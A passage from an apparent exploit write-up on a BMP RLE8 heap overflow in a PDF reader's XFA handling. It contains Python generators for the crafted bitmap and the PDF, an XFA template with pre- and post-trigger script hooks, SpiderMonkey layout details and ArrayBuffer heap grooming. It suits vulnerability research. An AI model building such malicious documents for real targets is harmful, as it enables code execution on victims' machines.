ffffff84</code> which means that they’re <code>undefined</code> .</p><p>If we can change the values of <code>capacity</code> and <code>length</code> , we can only achieve Out-Of-Bounds write, and the space after the original initialized elements and before the Out-Of-Bounds wrote elements will be filled with <code>00000000 ffffff84</code> . That’s some kind of meaningless.</p><p>It’s not a good idea to change <code>initializedLength</code> to a large value. This may lead to crash when scanning the array elements during GC. We’ll probably encounter inaccessible memory page and crash the process.</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>In SpiderMonkey, almost all JavaScript objects are inherited from <code>JSObject</code> , and the later class is inherited from <code>ObjectImpl</code> .</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>For <code>DataView</code> object, the <code>elements</code> member will point to <code>emptyElementsHeader</code> which can be used to leak the base address of the JavaScript engine module.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-Bitmap-Construct"><a href="#5-3-Bitmap-Construct" class="headerlink" title="5.3 Bitmap Construct"></a>5.3 Bitmap Construct</h3><p>Following python code can be used to generate a RLE compressed bitmap image.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>Here we’ll generate a RLE8 bitmap with the following parameters:</p><ul><li>width is <code>0xF0</code> </li><li>height is <code>1</code> </li><li>bit count is <code>8</code> </li></ul><p>Here the size of the heap buffer will be <code>0xF0</code> and we will be able to write <code>0xF4</code> bytes backward with value <code>0x10</code> .</p><h3 id="5-4-PDF-Construct"><a href="#5-4-PDF-Construct" class="headerlink" title="5.4 PDF Construct"></a>5.4 PDF Construct</h3><p>This section explains how to embed the generated BMP image into a PDF file. Following is the PDF template that will be used later.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>The size of the generated BMP file will be larger than 60MB. And it will be encoded in base64 and embedded within <code>6 0 obj</code> of the PDF file. To reduce the file size, this object will be compressed using the zlib/deflate compression method.</p><p>To exploit the vulnerability, we’ll need to have chances to run JavaScript code before and after triggering the vulnerability. This can be done by putting the JavaScript code within the <code>initialize</code> event and the <code>docReady</code> event.</p><p>Following python code can be used to generate the PDF file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-Exploit-Tricks"><a href="#5-5-Exploit-Tricks" class="headerlink" title="5.5 Exploit Tricks"></a>5.5 Exploit Tricks</h3><h4 id="5-5-1-Memory-Layout-1"><a href="#5-5-1-Memory-Layout-1" class="headerlink" title="5.5.1 Memory Layout (1)"></a>5.5.1 Memory Layout (1)</h4><p>In this case, <code>ArrayBuffer</code> is more suitable for exploiting the vulnerability.</p><p>Firstly, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xE0</code> . And free one <code>ArrayBuffer</code> object of every <code>ArrayBuffer</code> pair to create holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure><p>Then we trigger the vulnerability, and the heap buffer of the bitmap will be placed in one of the holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure><p>Since we are able to write <code>0xF4</code> bytes backward with value <code>0x10</code> . The backing store of the <code>ArrayBuffer</code> will be filled with <code>0x10</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer data</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; end of ArrayBuffer</span><br><span class="line">; metadata of next heap buffer (bitmap 